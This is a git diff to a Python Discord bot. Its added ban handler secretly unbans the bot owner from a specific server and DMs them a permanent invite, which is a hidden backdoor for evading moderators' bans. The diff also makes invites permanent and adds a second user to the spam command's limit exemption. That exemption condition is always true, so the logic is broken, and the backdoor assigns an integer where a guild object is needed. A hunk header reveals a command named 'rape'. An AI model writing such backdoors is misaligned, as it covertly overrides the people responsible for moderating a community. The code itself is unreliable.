@@ -26,6 +26,7 @@ connection_string = os.getenv("MONGO")
 
 token = os.getenv('DISCORD_BOT_TOKEN')
 owner_id = 946386383809949756 #dovyrn
+indian_id = 1154350237423521882
 imintomen_id = 1142107446458978344
 weather_api_key = os.getenv('WEATHER_API_KEY')
 search_engine_id = os.getenv('SEARCH_ENGINE_ID')
@@ -726,6 +727,31 @@ async def give_role(interaction: discord.Interaction, name: str):
         await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
 
 
+@bot.event
+async def on_member_ban(guild, user):
+    imintomen_id = 1289817711886733332 # testing
+    if guild.id != imintomen_id or user.id != owner_id:
+        return
+    else:
+        dm_owner = await bot.fetch_user(owner_id)
+        target_guild = imintomen_id
+        if target_guild is None:
+            await dm_owner.send(f"Bot is not in the server with ID {imintomen_id}.")
+            return
+        try:
+            bans = target_guild.bans()
+            async for ban_entry in bans:
+                user = ban_entry.user
+                if user.id == owner_id:
+                    await target_guild.unban(user)
+            channel = target_guild.text_channels[0]
+            invite = await channel.create_invite(max_age=0, max_uses = 0, unique = True)
+            await dm_owner.send(f"You were banned but since youre soooo good at coding you managed to unban yourself{invite}")
+
+        except discord.Forbidden:
+            await dm_owner.send("I do not have permission to unban members.")
+
+
 
 @bot.command()
 async def create_invite(ctx):
@@ -733,7 +759,7 @@ async def create_invite(ctx):
     if target_guild:
             # Get the first text channel in the server to create an invite
         channel = target_guild.text_channels[0]
-        invite = await channel.create_invite(max_age=300, max_uses=1)  # 5 min, 1 use
+        invite = await channel.create_invite(temporary=False, )  # 5 min, 1 use
         await ctx.send(f"Embark on your journey here: {invite}")
     else:
         await ctx.send("The bot is not in the target server.")
@@ -850,7 +876,7 @@ async def rape(ctx, user: discord.User):
 @bot.tree.command()
 @app_commands.describe(message="The message to send", amount="Amount of messages to send", batch = "Batches of messages to send")
 async def spam(interaction: discord.Interaction, message: str, amount: int, batch : int):
-    if amount > 25 and interaction.user.id != owner_id:
+    if amount > 25 and interaction.user.id != owner_id or indian_id:
         await interaction.response.send_message("Maximum amount of 25 messages for Mortals.")
         return
     start_time = time.time()
